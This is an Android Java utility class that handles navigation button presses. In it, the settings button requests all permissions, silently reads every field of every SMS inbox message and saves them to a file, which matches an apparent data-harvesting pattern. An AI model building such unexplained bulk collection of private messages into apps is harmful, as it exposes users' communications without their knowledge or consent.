package com.vikasyadavnsit.cdc.utils;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.fragment.HomeFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.stream.Stream;

public class ActionUtil {

    public static void handleButtonPress(AppCompatActivity activity, int... viewIds) {
        ActionUtil actionUtil = new ActionUtil();
        for (int viewId : viewIds) {
            actionUtil.handleButtonPress(activity, viewId);
        }
    }

    public static void handleButtonPress(AppCompatActivity activity, int viewId) {

        Button actionButton = activity.findViewById(viewId);

        if (R.id.main_navigation_request_home_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
            });
        } else if (R.id.main_navigation_request_settings_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
                new PermissionManager().requestAllPermissions(activity);
                //permissionHandler.resetAllPermissionManually(this);
                Object messages = readSmsMessages(activity);
                FileUtil.createFile(activity.getApplicationContext(), FileMap.SMS, messages);
            });
        }
    }


    @SuppressLint("Range")
    private static Object readSmsMessages(Context context) {
        List<Map<String, String>> messages = new ArrayList<>();

        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> message = new TreeMap<>();
                    Stream.of(cursor.getColumnNames()).forEach(columnName ->
                            message.put(columnName, cursor.getString(cursor.getColumnIndex(columnName))));
                    messages.add(message);
                } while (cursor.moveToNext());
                cursor.close();
            }
            return messages;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

}
